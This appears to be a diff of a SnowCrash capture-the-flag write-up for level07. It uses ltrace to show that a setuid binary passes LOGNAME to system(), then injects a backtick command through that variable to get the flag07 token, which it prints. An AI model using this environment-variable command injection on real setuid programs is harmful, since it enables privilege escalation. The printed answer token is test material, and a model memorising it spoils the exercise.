@@ -1,14 +1,29 @@
-< level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
-# now we see if the LOGNAME env variable is as we want it
-< level07@SnowCrash:~$ env
-> SHELL=/bin/bash
-<> [...]
-> SHLVL=2
-> LOGNAME=`getflag`
-> SSH_CONNECTION=192.168.1.85 49954 192.168.1.83 4242
-> LESSOPEN=| /usr/bin/lesspipe %s
-> LESSCLOSE=/usr/bin/lesspipe %s %s
-> _=/usr/bin/env
-# and since it prints the value of logname, it should print the result of getflag, running as flag07
+##Level 07:
+#The program only print level07
+level07@SnowCrash:~$ ./level07
+level07
+
+#The ltrace result give us more information about the behavior of this program.
+ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                = 2007
+geteuid()                                                = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
+getenv("LOGNAME")                                        = "level07"
+asprintf(0xbffff734, 0x8048688, 0xbfffff45, 0xb7e5ee55, 0xb7fed280) = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                   = 0
++++ exited (status 0) +++
+
+#The level07 program, get the env variable call LOGNAME, and execute the system function with it.
+#system("/bin/echo ENV_LOGNAME");
+
+#Now we can control the env variable from outside the program if we change it for $(getflag) to print the result of getflag as user flag07.
+export LOGNAME="\`getflag\`"
+
+#And since it prints the value of logname, it should print the result of getflag, running a>
 < level07@SnowCrash:~$ ./level07
 > Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
